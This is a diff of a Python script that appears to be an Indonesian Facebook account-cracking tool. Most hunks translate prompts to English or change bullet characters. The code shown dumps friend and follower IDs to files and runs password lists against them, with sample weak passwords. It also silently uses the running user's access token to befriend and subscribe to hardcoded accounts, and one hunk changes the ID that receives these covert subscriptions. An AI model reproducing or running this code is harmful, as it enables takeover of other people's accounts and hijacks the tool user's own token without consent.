@@ -67,7 +67,7 @@ def login():
                 except KeyError:
                         exit("\x1b[1;93m╠══◍➤®[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Expired")
 	elif login == "2":
-		print("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Youtube")
+		print("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m You Will Be Redirected To Youtube")
 		time.sleep(2)
 		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
 		exit()
@@ -93,7 +93,7 @@ def bot_follow():
 	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Aa 😎","Hai Aa 😎"])
 	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
 	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
-	kata_utama3 = ("I love you @[100000834003593:]")
+	kata_utama3 = ("I love you Aa @[100000834003593:]")
 	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
 	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
@@ -115,11 +115,11 @@ def publik():
                 login()
         try:
                 idt = raw_input("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
+                file = raw_input("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Name File :\x1b[1;96m ")
                 try:
                         req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                         op = json.loads(req.text)
-                        print("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
+                        print("\x1b[1;96m╠══◍➤®[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Name :\x1b[1;96m "+op["name"])
                 except KeyError:
                         print('\x1b[1;91m╠══◍➤®[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
 	                print("\x1b[1;92m║")
@@ -192,11 +192,11 @@ def follower():
                 login()
         try:
                 idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Profil ID :\x1b[1;92m ")
-                file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama File :\x1b[1;92m ")
+                file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                 try:
-                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                         op = json.loads(req.text)
-                        print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama : \x1b[1;92m"+op["name"])
+                        print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name : \x1b[1;92m"+op["name"])
                 except KeyError:
                         print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Profil Tidak Ditemukan')
 	                print("\x1b[1;92m║")
@@ -233,7 +233,7 @@ def teman():
                 time.sleep(2)
                 login()
         try:
-		file = raw_input("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
+		file = raw_input("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m Name File :\x1b[1;96m ")
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 except KeyError:
@@ -246,7 +246,7 @@ def teman():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
 		print("\r\x1b[1;97m                   ")
                 print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
@@ -341,7 +341,7 @@ def daftar_menu():
 		exit()
 	elif pilih == "0":
 		try:
-			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
+			print("\x1b[1;93m[\x1b[1;97m•\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
 			os.remove("___bangsat___")
 		except Exception as e:
 			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
@@ -496,7 +496,7 @@ class crack:
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
+							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -510,14 +510,14 @@ class crack:
 				except Exception as e:
 					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
+				print("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
 				self.pwlist()
 				break
 			elif f=="t":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
+							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -694,7 +694,7 @@ class crack3:
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
+							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
